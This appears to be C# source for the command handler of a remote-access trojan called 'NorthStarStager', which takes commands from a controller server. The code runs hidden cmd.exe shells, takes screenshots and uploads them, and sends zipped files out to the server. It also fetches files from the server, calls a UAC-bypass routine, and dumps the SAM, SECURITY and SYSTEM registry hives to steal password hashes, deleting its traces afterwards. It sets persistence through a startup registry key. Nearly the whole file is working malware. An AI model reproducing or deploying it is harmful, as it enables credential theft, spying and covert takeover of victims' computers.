using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Forms;

namespace NorthStarStager
{

    /*
    <explanation>     
    Class that responsible for processing command and retrieving response.
    </explanation>
    */
    class processCommand
    {
        initialEnum enumObj;
        privilegeEscalation privs;
        addPersistence persObj;
        public bool wasScreenshot = false;
        public bool cmdModeEnabled = false;
        public bool powershellModeEnabled = false;
        public processCommand(initialEnum enumEnv, privilegeEscalation priv, addPersistence persistenceObj)
        {
            enumObj = enumEnv;
            privs = priv;
            persObj = persistenceObj;
        }


        /*
         <explanation>     
         IF <space> character exists in command parse it into 2 parts. 
         First  part is root command  and the second is argument. 
         And then send command and argument to <function> _checkCommand </function> set response value as results.
         Convert results into base64 form and send it back to the server.
        </explanation>
       */
        public string _parseCommand(string command)
        {
            if (command.Contains(" "))
            {

                StringBuilder arguments = new StringBuilder();


                string[] parsedCommand = command.Split(' ');

                for (int i = parsedCommand[0].Length + 1; i < command.Length; i++)
                {
                    arguments.Append(command[i]);

                }

                string results = _checkCommand(parsedCommand[0], arguments.ToString());
                return results;
            }
            else
            {
                string results = _checkCommand(command, "");
                return results;
            }


        }


        /*
       <explanation>     
       Check value of command via IF statements and call corresponding function to get results of command.
       Finally return results.
       If no match via IF parameters return empty result.
       </explanation>
        */
        public string _checkCommand(string command, string argument)
        {


            if (command == "ping")
            {
                return "pong";
            }

            else if (command == "pwd")
            {
                return _workingDir();

            }

            else if (command == "cd")
            {

                return _setWorkingDir(argument);
            }

            else if (command == "rm" || command == "del")
            {

                return _deleteFile(argument);
            }

            else if (command == "whoami")
            {

                return _getUser();
            }

            else if (command == "dir" || command == "ls")
            {

                if (argument.Length < 2)
                {
                    return _enumDir(_workingDir());
                }
                else
                {
                    return _enumDir(argument);
                }

            }

            else if (command == "ipconfig" || command == "ifconfig")
            {

                return _getIP();
            }

            else if (command == "cat" || command == "type")
            {

                return _getContent(argument);
            }

            else if (command == "waittime" || command == "wait" || command == "responsetime" || command == "timer")
            {
                return _setWaitTime(enumObj, argument);

            }

            else if (command == "screenshot" || command == "schot")
            {

                _captureScreenShot();
            }

            else if (command == "upload" || command == "uploadfile")
            {
                return _downloadFile(argument);


            }

            else if (command == "ps" || command == "process" || command == "processes")
            {
                return _getProcesses();
            }

            else if (command == "enablecmd" || (command == "enable" && argument == "cmd"))
            {
                cmdModeEnabled = true;
                return "Cmd mode enabled, all commands will be redirect to CMD. Response delay is : " + enumObj.waitTime + " miliseconds";
            }

            else if (command == "uac" || command == "bypassuac")
            {
                return _privEsc(privs);
            }

            else if (command == "sam" || command == "samdump")
            {
                return _samDump();
            }
            
            else if(command== "download" || command == "get")
            {

                return _uploadAnyFile(argument);
            }
            else if(command == "pers" || command =="persistence")
            {
                return _gainPersistence();
            }
                

            
            return "Command not found, you may need to enable CMD mode <enablecmd or enable cmd>";

        }


        /*
        <explanation>     
        Enumerate current directory to retrieve sub directories and files. And return it as result.
        <method>EnumerateDirectories</method> and <method>EnumerateFiles</method> are built in methods can be used via <namespace>System.IO</namespace>
        It is prevented to retrieve hidden files because they causes an odd error while converting results into base64 format.
        Append every line into one string and return it as results.
        </explanation>
        */
        public string _enumDir(string argument)
        {
            StringBuilder sb = new StringBuilder();

            try
            {
                var dirs = from dir in
                   Directory.EnumerateDirectories(argument)
                           select dir;
                foreach (var dir in dirs)
                {
                    sb.Append(dir.ToString());
                    sb.Append(Environment.NewLine);
                }
            }

            catch
            {

                return "Not enough privileges to enumerate directory.";
            }

            try
            {
                var files = from file in
                Directory.EnumerateFiles(argument)
                            select file;

                foreach (var file in files)
                {
                    if (!((File.GetAttributes(file) & FileAttributes.Hidden) == FileAttributes.Hidden))
                    {
                        sb.Append(file.ToString());
                        sb.Append(Environment.NewLine);
                    }
                }

            }
            catch
            {

                return "Not enough privileges to enumerate directory."; //I dont know why im doing this but its feels like i need to do this.
            }

            return sb.ToString();
        }


        /*
        <explanation>     
        Retrieve username of current user from built-in <class>WindowsIdentity()</class>.
        Append every line into one string and return it as result;
        </explanation>
         */
        public string _getUser()
        {

            return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        }


        /*
       <explanation>     
       Retrieve the full path of current directory from <class>Environment</class>. 
       Append every line into one string and return it as result
       </explanation>
        */
        public string _workingDir()
        {
            return Environment.CurrentDirectory;
        }

        public string _setWorkingDir(string path)
        {
            try
            {
                if ((Directory.Exists(path)))
                {
                    Directory.SetCurrentDirectory(path);
                    return "Directory changed succesfully";
                }
                else if ((Directory.Exists(_workingDir() + '\\' + path)))
                {

                    Directory.SetCurrentDirectory(_workingDir() + '\\' + path);
                    return "Directory changed succesfully";
                }
                else
                {
                    return "Directory not found.";
                }
            }
            catch
            {
                return "An error happened while changing directory";
            }


        }


        /*
       <explanation>     
       Retreive local IP addresses from <class>DNS</class>.
       Append everyline into one string and return it as result;
       </explanation>
        */
        public string _getIP()
        {
            StringBuilder ipadresses = new StringBuilder();

            System.Net.IPAddress[] localIPs = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName());

            foreach (var ip in localIPs)
            {
                ipadresses.Append(ip.ToString());
                ipadresses.Append(Environment.NewLine);

            }

            return ipadresses.ToString();
        }


        /*
      <explanation>     
      Delete file.
      </explanation>
       */
        public string _deleteFile(string file)
        {
            try
            {
                if ((File.Exists(file)))
                {

                    File.Delete(file);
                    return "File deleted";

                }
                else if ((File.Exists(_workingDir() + '\\' + file)))
                {
                    File.Delete(file);
                    return "File deleted.";
                }
                else
                {
                    return "File not found.";
                }
            }

            catch
            {
                return "An error happened while changing directory";
            }

        }


        /*
      <explanation>     
      Read content of a file via <method>ReadAllLines</method> of <class>File</class>.
      Append every line into one string and return it as result.
      </explanation>
       */
        public string _getContent(string file)
        {
            StringBuilder content = new StringBuilder();

            if (File.Exists(file))
            {
                string[] lines = File.ReadAllLines(file);
                foreach (var line in lines)
                {

                    content.Append(line);
                    content.Append(Environment.NewLine);
                }
                return content.ToString();
            }
            else
            {
                string newPath = Environment.CurrentDirectory + "\\" + file; //Deal with sitituation like cat example.txt

                if (File.Exists(file))
                {
                    string[] lines = File.ReadAllLines(file);
                    foreach (var line in lines)
                    {

                        content.Append(line);
                        content.Append(Environment.NewLine);
                    }
                    return content.ToString();

                }
                else
                {

                    return "File not exists.";
                }

            }
        }

        /*
     <explanation>
     Time interval to send GET request to the controller server.
     Specified Get request is used to retrieve commands from server.
     By default time interval is between 8 seconds to 23 seconds but i can be setted to
     fixed interval by setting <variable>waitTime</variable> of <class>initialEnum</class> to a fixed value.
     To control if <variable>waitTime</variable> setted by hand, another variable <variable>isWaitTimeManuallySetted</variable> is used.
     </explanation>
      */
        public string _setWaitTime(initialEnum enumenv, string argument)
        {
            enumenv.waitTime = System.Convert.ToInt32(argument) * 1000;
            enumenv.isWaitTimeManuallySetted = true;
            return "Wait time is setted to: " + argument + " seconds";
        }


        /*
        <explanation>
         This function takes screenshot of current screen and saves it into specified path.
         And finally sends saved file to controller server.
         To get whole screen, current width and height values of screen is taken from <class>Screen</class>.
         As save path Temprorary path is used. <method>GetTempPath()</method> of <class>Path</class> returns temporary path value.
         As name <variable>clientID<variable> and Current date is concataneted in order to prevent file duplicate.
         This function  not returns a string as result so no string will be sended to controller server.
         <variable>wasScreenshot</variable> is used for preventing sending empty string to server as result. Results of 
         screenshot operation is setted by controller server itself as "S operation is completed" if it recieves a screenshot from client.
         </explanation>
        */
        public void _captureScreenShot()
        {
            int x = System.Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width);
            int y = System.Convert.ToInt32(SystemParameters.PrimaryScreenWidth);
            string savePath = Path.GetTempPath();
            Bitmap memoryImage;
            memoryImage = new Bitmap(x, y);
            Size s = new Size(memoryImage.Width, memoryImage.Height);

            Graphics memoryGraphics = Graphics.FromImage(memoryImage);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

            string fileName = savePath +
                       enumObj.clientID + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png";
            memoryImage.Save(fileName);

              string uploadResult =  _uploadFile(fileName);
            if (!uploadResult.Contains("Exception"))
            {
                wasScreenshot = true;
                _deleteFile(fileName);

            }
            else
            {
                wasScreenshot = false;
            }

        }


        /*
        <explanation>
        This function is used for downloading files from server. As save path Temp is choosed. 
        In order to prevent file duplicates file names are randomly generated in server-side.
        </explanation>
        */
        public string _downloadFile(string argument)
        {

            Uri myUri = new Uri(Globals.fileDownloadUri + argument);
            string fileName = Path.GetTempPath() + System.IO.Path.GetFileName(myUri.LocalPath);
            System.Net.WebClient web = new System.Net.WebClient();
            try
            {
                web.DownloadFileAsync(myUri, fileName);
                return "File transferred to client: " + fileName;
            }
            catch
            {
                return "File transfer operation failed.";
            }
        }


        /*
      <explanation>
      This function is used for retrieving running processes from <method>GetCurrentProcess</method> of <class>Process</class>. 
      <namespace>System.Diagnostics</namespace> is required for this task.
      </explanation>
      */
        public string _getProcesses()
        {

            Process[] all = Process.GetProcesses();
            StringBuilder sb = new StringBuilder();
            foreach (var proc in all)
            {
                sb.Append(proc.Id.ToString() + " ");
                sb.Append(proc.ProcessName.ToString());
                sb.Append(Environment.NewLine);
            }
            return sb.ToString();
        }


        /*
   <explanation>
   This function is used for retrieving running processes from <method>GetCurrentProcess</method> of <class>Process</class>. 
   <namespace>System.Diagnostics</namespace> is required for this task.
   </explanation>
   */
        public string _privEsc(privilegeEscalation privs)
        {

            string result = privs._eventVwr();
            return result;
        }


        /*
    <explanation>
    DUMP NTLM hashes from SAM.
    </explanation>
        */
        public string _samDump()
        {
            if (enumObj.isAdmin)
            {
                string args = "reg.exe save hklm\\sam c:\\temp\\sam.save & reg.exe save hklm\\security c:\\temp\\security.save & reg.exe save hklm\\system c:\\temp\\system.save";
                string result = "";
                try
                {
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c" + args;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.WorkingDirectory = this._workingDir();
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.StartInfo.Verb = "runas";
                    p.Start();
                    result += p.StandardOutput.ReadToEnd();
                    result += p.StandardError.ReadToEnd();

                    string savePath = Path.GetTempPath();

                    string fullZipPath = savePath + enumObj.clientID + "_" + "SAMDUMP" + ".zip";

                    System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(savePath);
                    IEnumerable<System.IO.FileInfo> fileList = dir.GetFiles("*.save", System.IO.SearchOption.TopDirectoryOnly);

                    var zip = ZipFile.Open(fullZipPath, ZipArchiveMode.Create);
                    foreach (var file in fileList)
                    {

                        zip.CreateEntryFromFile(file.FullName, file.Name, CompressionLevel.Optimal);
                    }

                    zip.Dispose();

                    foreach (var file in fileList)
                    {

                        _deleteFile(file.FullName);
                    }

                    _uploadFile(fullZipPath);

                    _deleteFile(fullZipPath);
                    return "";
                }
                catch
                {
                    return "";
                }
            }
            else
            {
                return "This operation requires administrative privileges";
            }
        }


        /*
     <explanation>
     This function is used for retrieving running processes from <method>GetCurrentProcess</method> of <class>Process</class>. 
     <namespace>System.Diagnostics</namespace> is required for this task.
     </explanation>
     */
        public void _cmdMode(string command, sendRetrieve sendObj, initialEnum enumEnv, System.Net.WebClient web, Chiper chipops, String uri)
        {
            string result = "";

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c" + command;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WorkingDirectory = this._workingDir();
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            if(enumEnv.isAdmin)
             p.StartInfo.Verb = "runas";
            p.Start();
            result += p.StandardOutput.ReadToEnd();
            result += p.StandardError.ReadToEnd();
             sendObj._sendResult(result, web, enumEnv, chipops);
           
            
        }


        public string _isFileExists(string fileName)
        {
            if (!File.Exists(fileName))
            {
                if (File.Exists(_workingDir() + "\\" + fileName))
                {
                    fileName = _workingDir() + "\\" + fileName;
                }
                else
                {
                    return "File Not Found.";
                }
            }
            return fileName;
        }

        public string _uploadFile(string fileName)
        {
            string fileStatus = _isFileExists(fileName);
            if (fileStatus != "File Not Found")
            {
                System.Net.WebClient Client = new System.Net.WebClient();

                Client.Headers.Add("Content-Type", "binary/octet-stream");
                try
                {
                    Client.UploadFile(Globals.fileUploadUri, fileName);
                }
                catch
                {
                    return "An Error occured while uploading file to server.";

                }
            }
            return "File Not Exists";
        }


        public string _uploadAnyFile(string fileName)
        {

            string fileStatus = _isFileExists(fileName);
            if (fileStatus != "File Not Found")
            {
                string savePath = Path.GetTempPath();
                   Guid g = Guid.NewGuid();
                  string GuidString = Convert.ToBase64String(g.ToByteArray());
                    GuidString = GuidString.Replace("=","");
                    GuidString = GuidString.Replace("+","");
                string fullZipPath = savePath + enumObj.clientID + "_" + fileName + "_" + GuidString +".zip";
                System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(savePath);

                var zip = ZipFile.Open(fullZipPath, ZipArchiveMode.Create);

                zip.CreateEntryFromFile(fileName, fileName, CompressionLevel.Optimal);
                zip.Dispose();
                _uploadFile(fullZipPath);
                _deleteFile(fullZipPath);
                return "";
            }
            else
            {
                return "File Not Exists";
            }
        }

        /*<explanation>
         * 
         *Gain persistence via start-up registery key.
         * </explanation>
         * */
         public string _gainPersistence()
        {
            return persObj._copyItSelf();

        }

 

    }
}
